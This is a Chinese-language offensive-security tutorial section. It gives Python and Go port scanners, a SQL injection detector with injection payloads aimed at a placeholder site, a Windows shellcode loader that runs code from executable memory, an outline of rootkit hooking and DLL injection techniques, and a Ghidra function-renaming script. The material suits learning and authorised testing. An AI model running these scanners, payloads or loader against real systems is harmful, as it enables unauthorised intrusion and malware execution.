## 实战：从入门到造轮子

### 1. 端口扫描器（Python）

```python
import socket
import concurrent.futures

def scan_port(host, port):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((host, port))
        # 获取 Banner
        s.send(b'\r\n')
        banner = s.recv(1024).decode(errors='ignore').strip()
        return port, True, banner
    except:
        return port, False, ''
    finally:
        s.close()

def quickscan(host, ports=range(1, 1025)):
    print(f'Scanning {host} ...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        results = ex.map(lambda p: scan_port(host, p), ports)
    for port, open_, banner in results:
        if open_:
            print(f'  [OPEN] Port {port}  {banner[:50]}')

if __name__ == '__main__':
    quickscan('192.168.1.1')
```

### 2. Go 版端口扫描器（高性能）

```go
package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

func scanPort(host string, port int, wg *sync.WaitGroup) {
    defer wg.Done()
    target := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", target, time.Second)
    if err == nil {
        fmt.Printf("[OPEN] Port %d\n", port)
        conn.Close()
    }
}

func main() {
    host := "192.168.1.1"
    var wg sync.WaitGroup
    for port := 1; port <= 65535; port++ {
        wg.Add(1)
        go scanPort(host, port, &wg)
    }
    wg.Wait()
}
```

### 3. 简单 SQL 注入检测（Python）

```python
import requests

class SQLiDetector:
    def __init__(self):
        self.payloads = [
            "'",
            "1 OR '1'='1",
            "1 AND 1=1--",
            "1' SLEEP(3)--",
            "1' UNION SELECT NULL--",
        ]
        self.errors = [
            'sql syntax',
            'mysql',
            'syntax error',
            'unclosed quotation',
            'postgres',
            'microsoft sql',
            'ORA-0',
        ]

    def test(self, url):
        """测试单个 URL 是否有注入"""
        for payload in self.payloads:
            test_url = f'{url}{"&" if "?" in url else "?"}id={payload}'
            try:
                resp = requests.get(test_url, timeout=5)
                content = resp.text.lower()
                for err in self.errors:
                    if err in content:
                        return True, payload, err
            except:
                continue
        return False, None, None

detector = SQLiDetector()
found, payload, err = detector.test('http://target.com/page.php')
if found:
    print(f'[SQLi!] Payload={payload} → {err}')
```

### 4. Shellcode Loader（C/C++）

```c
// 最简单的 Shellcode 执行器
#include <windows.h>
#include <stdio.h>

int main() {
    // Shellcode (例如 MessageBox)
    unsigned char sc[] = {
        0x90, 0x90, 0x90, 0x90  // NOP sled
        // ... 完整 shellcode ...
    };

    // 分配可执行内存
    void* mem = VirtualAlloc(
        NULL, sizeof(sc),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 写入 Shellcode
    memcpy(mem, sc, sizeof(sc));

    // 执行
    ((void(*)())mem)();

    return 0;
}
```

### 5. Rootkit 基础（Windows）

```
Kernel-level Rootkit 技术:
├── SSDT Hook → 替换系统服务表
├── Inline Hook → 替换函数前几个字节为 JMP
├── IDT Hook → 中断描述符表 Hook
├── IRP Hook → 驱动 Hook
├── EAT/IAT Hook → 导出/导入表 Hook
└── Object Manager Hook → 内核对象操作

User-level Rootkit:
├── API Hook (Inline / IAT)
├── Dll 注入 (CreateRemoteThread)
├── APC 注入
├── COM Hijack
└── Hook NtQueryDirectoryFile → 文件隐藏
```

### 6. 反编译器插件（Ghidra）

```python
# Ghidra Script - 批量重命名函数
# Save as: AutoRenamer.py

import ghidra.program.model.listing.Function as Function

def main():
    listing = currentProgram().getListing()
    symbolTable = currentProgram().getSymbolTable()
    functions = listing.getFunctions(True)

    count = 0
    for func in functions:
        name = func.getName()
        # 根据特征重命名
        if 'InternetOpen' in str(func):
            symbolTable.addSymbol(
                func.getEntryPoint(),
                0, 'http_open_session',
                SymbolType.FUNCTION
            )
            count += 1

    print(f'Renamed {count} functions')

main()
```
